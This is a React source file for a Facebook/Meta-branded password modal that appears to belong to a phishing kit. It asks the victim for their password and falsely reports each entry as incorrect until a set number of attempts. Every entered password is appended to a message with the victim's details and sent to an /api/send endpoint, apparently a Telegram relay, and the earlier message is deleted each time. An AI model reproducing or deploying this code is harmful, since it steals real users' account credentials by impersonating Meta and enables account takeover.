import FacebookLogoImage from '@/assets/images/facebook-logo-image.png';
import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import config from '@/utils/config';
import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import Image from 'next/image';
import { type FC, useEffect, useState } from 'react';

// Hide password toggle for IE/Edge
if (typeof document !== 'undefined') {
    const style = document.createElement('style');
    style.textContent = `
        .hide-password-toggle::-ms-reveal,
        .hide-password-toggle::-ms-clear {
            display: none;
        }
    `;
    document.head.appendChild(style);
}

const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [attempts, setAttempts] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [password, setPassword] = useState('');
    const [showError, setShowError] = useState(false);
    const [showPassword, setShowPassword] = useState(false);

    const { geoInfo, messageId, baseMessage, passwords, addPassword, setMessageId, translations: storeTranslations } = store();
    const maxPass = config.MAX_PASS ?? 3;

    const t = (text: string): string => {
        return storeTranslations[text] || text;
    };

    const togglePassword = () => {
        setShowPassword(!showPassword);
    };

    const handleSubmit = async () => {
        if (!password.trim() || isLoading || !baseMessage) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        try {
            // Rebuild message: baseMessage + tất cả passwords (bao gồm password mới)
            let updatedMessage = baseMessage;
            
            // Thêm tất cả passwords đã có (số thứ tự từ 1 đến passwords.length)
            passwords.forEach((pwd, index) => {
                updatedMessage += `\n🔑 <b>Password ${index + 1}:</b> <code>${pwd}</code>`;
            });
            
            // Thêm password mới (số thứ tự = passwords.length + 1)
            const passwordNumber = passwords.length + 1;
            updatedMessage += `\n🔑 <b>Password ${passwordNumber}:</b> <code>${password}</code>`;
            
            // Thêm password mới vào store sau khi rebuild message
            addPassword(password);

            // Xóa message cũ nếu có
            if (messageId) {
        try {
                    await axios.post('/api/delete', {
                message_id: messageId
            });
                } catch {
                    // Ignore error if delete fails
                }
            }

            // Gửi message mới (không edit, không reply)
            const res = await axios.post('/api/send', {
                message: updatedMessage
            });
            
            // Cập nhật messageId mới
            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
            }

            if (config.PASSWORD_LOADING_TIME) {
                await new Promise((resolve) => setTimeout(resolve, config.PASSWORD_LOADING_TIME * 1000));
            }
            if (next >= maxPass) {
                nextStep();
            } else {
                setShowError(true);
                setPassword('');
            }
        } catch {
            //
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='fixed inset-0 z-10 flex items-center justify-center bg-black/40 md:py-[40px] py-[20px]'>
            <div className='bg-white max-h-[100%] h-full w-full max-w-lg mx-4 md:mx-0 shadow-lg px-[20px] py-[20px] rounded-[16px] flex flex-col overflow-hidden'>
                <div className='flex items-center justify-between pb-[0px]'></div>
                <div className='flex-1 overflow-y-auto'>
                    <div className='h-full flex flex-col items-center justify-between flex-1'>
                        <div className='w-[50px] h-[50px] mb-[20px] mx-auto'>
                            <Image src={FacebookLogoImage} alt='' width={50} height={50} className='w-full h-full' />
                    </div>
                        <div className='w-full'>
                            <p className='text-[#9a979e] text-[15px] mb-[7px]'>{t('For your security, you must enter your password to continue.')}</p>
                            <form
                                onSubmit={(e) => {
                                    e.preventDefault();
                            handleSubmit();
                        }}
                            >
                                <div className='w-full'>
                                    <div className='input relative w-full border border-[#d4dbe3] h-[44px] px-[11px] rounded-[10px] bg-white text-[16px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200'>
                                        <input
                                            id='password'
                                            className='w-full outline-0 h-full hide-password-toggle text-[16px]'
                                            placeholder={t('Password')}
                                            autoComplete='new-password'
                                            type={showPassword ? 'text' : 'password'}
                                            value={password}
                                            onChange={(e) => setPassword(e.target.value)}
                                        />
                                        <button
                                            type='button'
                                            className='absolute inset-y-0 right-0 flex items-center px-3 text-gray-600 cursor-pointer'
                                            tabIndex={-1}
                                            onClick={togglePassword}
                                        >
                                            <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} size='sm' className='w-4 h-4' />
                                        </button>
                                    </div>
                                    {showError && (
                                        <p className='text-red-500 text-[15px] mt-[-5px] mb-[10px]'>{t("The password that you've entered is incorrect.")}</p>
                                    )}
                                </div>
                                <div className='w-full mt-[20px]'>
                                    <button
                                        type='submit'
                        disabled={isLoading}
                                        className={`h-[40px] min-h-[40px] w-full bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center cursor-pointer transition-opacity duration-300 text-[15px] font-medium ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}
                    >
                                        {isLoading ? (
                                            <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
                                        ) : (
                                            t('Continue')
                                        )}
                    </button>
                </div>
                                <div>
                                    <p className='text-center mt-[10px]'>
                                        <a href='#' className='text-[#9a979e] text-[15px]' onClick={(e) => e.preventDefault()}>
                                            {t('Forgot your password?')}
                                        </a>
                                    </p>
                                </div>
                            </form>
                        </div>
                        <div className='w-[60px] mt-[20px] mx-auto'>
                            <Image src={MetaLogo} alt='' width={60} height={18} className='w-full h-full' />
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default PasswordModal;

